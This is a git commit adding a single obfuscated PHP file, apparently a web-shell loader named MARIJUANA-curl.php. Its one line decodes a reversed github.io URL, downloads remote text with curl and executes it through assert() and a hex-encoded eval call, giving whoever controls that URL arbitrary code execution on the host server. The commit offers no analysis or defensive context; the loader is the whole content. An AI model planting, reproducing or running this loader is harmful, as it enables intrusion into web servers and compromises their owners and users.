f94320bdfef06244a525272551c2a99eda93092e
0x5a455553 <49539110+0x5a455553@users.noreply.github.com>
2019-04-18 14:32:34 +0700

    Create MARIJUANA-curl.php

---
+++ MARIJUANA-curl.php
@@ -0,0 +1,1 @@
+<?$_=curl_init();curl_setopt($_,CURLOPT_URL,strrev("txt.LANRETXE/ANAUJIRAM/oi.buhtig.355554a5x0//:sptth"));curl_setopt($_,CURLOPT_RETURNTRANSFER,1);curl_setopt($_,CURLOPT_HEADER,0);$____=curl_exec($_);curl_close($_);$___="\x65\x76\x61\x6c\x28\x24\x5f\x5f\x5f\x5f\x29";$__="\x61\x73\x73\x65\x72\x74";$__($___);?>
